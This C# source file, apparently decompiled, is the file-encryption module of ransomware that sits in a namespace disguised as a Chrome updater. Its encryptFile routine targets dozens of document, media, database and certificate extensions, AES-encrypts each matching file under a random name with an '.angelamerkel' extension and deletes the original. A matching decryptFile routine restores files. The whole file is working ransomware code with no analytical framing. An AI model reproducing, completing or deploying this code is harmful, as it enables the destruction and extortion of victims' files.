using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ChromeUpadter.Ransomware;

public class CryptFile
{
	[DebuggerNonUserCode]
	public CryptFile()
	{
	}

	public static string getRandomFileName()
	{
		string text = "";
		string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()";
		Random random = new Random();
		int location = random.Next(7, 13);
		while (Math.Max(Interlocked.Decrement(ref location), checked(location + 1)) > 0)
		{
			text += Conversions.ToString(text2[random.Next(text2.Length)]);
		}
		return text;
	}

	public static bool encryptFile(string orgFile, byte[] aesKey)
	{
		checked
		{
			try
			{
				string text = ".exe .png .3dm .3g2 .3gp .aaf .accdb .aep .aepx .aet .ai .aif .arw .as .as3 .asf .asp .asx .avi .bay .bmp .cdr .cer .class .cpp .cr2 .crt .crw .cs .csv .db .dbf .dcr .der .dng .doc .docb .docm .docx .dot .dotm .dotx .dwg .dxf .dxg .efx .eps .erf .fla .flv .idml .iff .indb .indd .indl .indt .inx .jar .java .jpeg .jpg .kdc .m3u .m3u8 .m4u .max .mdb .mdf .mef .mid .mov .mp3 .mp4 .mpa .mpeg .mpg .mrw .msg .nef .nrw .odb .odc .odm .odp .ods .odt .orf .p12 .p7b .p7c .pdb .pdf .pef .pem .pfx .php .plb .pmd .pot .potm .potx .ppam .ppj .pps .ppsm .ppsx .ppt .pptm .pptx .prel .prproj .ps .psd .pst .ptx .r3d .ra .raf .rar .raw .rb .rtf .rw2 .rwl .sdf .sldm .sldx .sql .sr2 .srf .srw .svg .swf .tif .vcf .vob .wav .wb2 .wma .wmv .wpd .wps .x3f .xla .xlam .xlk .ARIZ0NA.xll .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xqx .zip .class";
				string text2 = new FileInfo(orgFile).DirectoryName + "\\";
				string name = new FileInfo(orgFile).get_Name();
				string text3 = new FileInfo(orgFile).Extension.ToLower();
				if ((!text.Contains(text3) || Operators.CompareString(text3, "", false) == 0) ? true : false)
				{
					return false;
				}
				byte[] array = File.ReadAllBytes(orgFile);
				byte[] bytes = Encoding.UTF8.GetBytes(name);
				if (bytes.Length > 255)
				{
					return false;
				}
				Array.Resize(ref array, array.Length + 256);
				Array.ConstrainedCopy(bytes, 0, array, array.Length - 256, bytes.Length);
				File.WriteAllBytes(text2 + getRandomFileName() + ".angelamerkel", AES.encrypt(array, aesKey));
				File.Delete(orgFile);
				Thread.Sleep(500);
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static bool decryptFile(string orgFile, byte[] aesKey)
	{
		checked
		{
			try
			{
				string text = new FileInfo(orgFile).DirectoryName + "\\";
				string extension = new FileInfo(orgFile).Extension;
				_ = new FileInfo(orgFile).get_Name().Split(new char[1] { '.' })[0];
				if (Operators.CompareString(extension, ".angelamerkel", false) != 0)
				{
					return false;
				}
				byte[] byte_ciphertext = File.ReadAllBytes(orgFile);
				byte_ciphertext = AES.decrypt(byte_ciphertext, aesKey);
				byte[] array = new byte[256];
				Array.ConstrainedCopy(byte_ciphertext, byte_ciphertext.Length - 256, array, 0, 256);
				string @string = Encoding.UTF8.GetString(array);
				@string = @string.TrimEnd(new char[1] { '\0' });
				Array.Resize(ref byte_ciphertext, byte_ciphertext.Length - 256);
				File.WriteAllBytes(text + @string, byte_ciphertext);
				File.Delete(orgFile);
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}
}
